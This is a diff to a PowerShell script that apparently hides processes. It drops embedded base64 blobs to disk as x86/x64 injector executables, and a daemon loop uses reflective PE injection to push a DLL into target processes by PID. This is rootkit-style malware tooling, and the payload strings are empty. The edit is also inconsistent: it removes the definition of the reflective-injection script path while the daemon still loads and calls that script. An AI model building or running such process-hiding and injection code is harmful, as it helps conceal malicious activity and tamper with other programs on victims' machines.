@@ -1,8 +1,10 @@
 ﻿param([string[]] $n=@(),[int[]] $i=@(),[string[]] $x=@())
 $x64PayStringBase64=""
 $x86PayStringBase64=""
-$InvokeStringBase64=""
-$ReflectivePEScript=$PSScriptRoot+"\Invoke-ReflectivePEInjectionCopy.ps1"
+$Injector32Base64=""
+$Injector64Base64=""
+$Injector32Path=$PSScriptRoot+"\x86Inj.exe"
+$Injector64Path=$PSScriptRoot+"\x64Inj.exe"
 function writeFiles
 {
     param([string[]] $n=@(),[int[]] $i=@())
@@ -11,9 +13,12 @@ function writeFiles
     New-Item -Path $infoTransfetPath -ItemType file -Force >$null
     [string]$i|Out-File -Encoding utf8 -FilePath $infoTransfetPath -Append
     [string]$n|Out-File -Encoding utf8 -FilePath $infoTransfetPath -Append
-    New-Item -Path $ReflectivePEScript -ItemType file -Force >$null
-    $InvokeBytes=[Convert]::FromBase64String($InvokeStringBase64)
-    [io.file]::WriteAllBytes($ReflectivePEScript,$InvokeBytes)
+    New-Item -Path $Injector32Path -ItemType file -Force >$null
+    New-Item -Path $Injector64Path -ItemType file -Force >$null
+    $Inj32Bytes=[Convert]::FromBase64String($Injector32Base64)
+    [io.file]::WriteAllBytes($Injector32Path,$Inj32Bytes)
+    $Inj64Bytes=[Convert]::FromBase64String($Injector64Base64)
+    [io.file]::WriteAllBytes($Injector64Path,$Inj64Bytes)
 }
 
 function isElevated
@@ -95,13 +100,14 @@ function procHiderDaemon
                         if(Get-Process -Id $proc.ID -ErrorAction Ignore)
                             {
                             Write-Host $proc.Name is alive! pID =  $proc.ID
+                            #Write-Host "$($proc.Name) is x$(if(is64bit($proc)) {'64'} else {'86'})"
                             . $ReflectivePEScript
                             try
                             {
                             Invoke-ReflectivePEInjection -PEBytes $(if(is64bit($proc)){$x64DDLBytes}else{$x86DDLBytes}) -ProcId $proc.ID
                             }
                             catch{}
-                            "$($proc.Name) is x$(if(is64bit($proc)) {'64'} else {'86'})"
+                            Write-Host Finished Injection to $proc.Name
 
 
                             }
